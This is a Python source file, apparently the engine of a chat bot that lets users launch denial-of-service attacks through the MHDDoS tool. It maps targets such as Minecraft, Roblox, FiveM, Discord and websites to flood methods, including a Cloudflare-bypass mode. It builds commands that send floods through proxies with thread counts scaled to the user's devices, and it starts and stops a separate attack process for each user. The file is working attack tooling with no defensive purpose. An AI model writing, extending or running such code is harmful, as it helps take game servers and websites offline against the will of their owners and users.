# mhddos_engine.py
import asyncio
import os
import sys
from config import MHDDOS_FULL, MHDDOS_DIR, PROXIES_PER_DEVICE, proxy_attack_file


# ปรับตาม MHDDoS version ที่ใช้ — verify ด้วย `python3 start.py --help`
MODULE_MAP = {
    "minecraft":  ("L4", "MCBOT",  {}),
    "roblox":     ("L4", "UDP",    {}),
    "discord":    ("L4", "UDP",    {}),
    "fivem":      ("L4", "FIVEM",  {}),
    "web":        ("L7", "CFB",    {"rpc": 64}),
    "web_bypass": ("L7", "BYPASS", {"rpc": 64}),
    "web_stress": ("L7", "STRESS", {"rpc": 64}),
    "http_flood": ("L7", "GET",    {"rpc": 128}),
}

# module ที่เป็น L4 → ไม่มี HTTP ให้วัด speed
L4_MODULES = {"minecraft", "roblox", "discord", "fivem"}


class MHDDoSEngine:
    def __init__(self):
        self.running: dict[int, asyncio.subprocess.Process] = {}

    def _build_cmd(self, module: str, target: str, port: int,
                   duration: int, devices: int, proxies_path: str) -> list[str]:
        info = MODULE_MAP.get(module)
        if not info:
            raise ValueError(f"unknown module: {module}")

        layer, method, extra = info
        threads = max(100, devices * 50 * PROXIES_PER_DEVICE)
        rpc = extra.get("rpc", 64)

        if layer == "L7":
            host = target if target.startswith("http") else f"http://{target}"
            if port and ":" not in host.split("//")[-1]:
                host = f"{host}:{port}"
            return [
                sys.executable, MHDDOS_FULL,
                method, host, "5", str(threads),
                proxies_path, str(rpc), str(duration),
            ]
        else:
            host = target.split("//")[-1].split("/")[0]
            if ":" not in host:
                host = f"{host}:{port}"
            return [
                sys.executable, MHDDOS_FULL,
                method, host, str(threads), str(duration),
            ]

    async def start(self, user_id: int, module: str, target: str, port: int,
                    duration: int, devices: int):
        if user_id in self.running:
            raise RuntimeError("มี attack รันอยู่แล้ว")

        proxies_path = proxy_attack_file(user_id)
        cmd = self._build_cmd(module, target, port, duration,
                              devices, proxies_path)

        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
            cwd=MHDDOS_DIR,
        )
        self.running[user_id] = proc
        return proc

    async def stop(self, user_id: int):
        proc = self.running.pop(user_id, None)
        if proc and proc.returncode is None:
            try:
                proc.terminate()
                await asyncio.wait_for(proc.wait(), timeout=5)
            except asyncio.TimeoutError:
                try:
                    proc.kill()
                except ProcessLookupError:
                    pass
            except ProcessLookupError:
                pass

    def is_running(self, user_id: int) -> bool:
        proc = self.running.get(user_id)
        return proc is not None and proc.returncode is None

    async def shutdown_all(self):
        """เรียกตอน bot ปิด — terminate ทุก process"""
        for uid in list(self.running.keys()):
            await self.stop(uid)